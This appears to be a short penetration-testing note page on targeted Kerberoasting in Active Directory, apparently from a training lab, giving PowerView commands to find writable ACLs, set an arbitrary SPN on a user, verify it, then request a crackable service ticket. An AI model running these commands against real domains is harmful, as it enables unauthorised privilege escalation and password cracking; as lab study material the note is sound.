---
description: Setting up arbitrary SPN for user object.
---

# Set SPN

{% hint style="info" %}
**PowerView\_dev** is used for this attack!
{% endhint %}

## Enumerating permissions

Enumerate permissions on ACLs for specific group

```text
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

## Set SPN for User object

With enough rights \(GenericAll/GenericWrite\), a target user's SPN can be set to anything.  
Must be unique in the domain.

```text
Set-DomainObject -Identity support182user -Set @{serviceprincipalname='dcorp/whateverX'} -Verbose
```

### Verify SPN

Verify that SPN was set

```text
Get-NetUser support182user

...
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata : {9/11/2020 9:56:47 AM, 9/11/2020 9:56:47 AM, 1/1/1601 12:00:00 AM}
serviceprincipalname  : dcorp/whateverX
givenname             : Support182
...

```

## Attack

Rest of the attack is the same as in "classic" Kerberoast.

We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

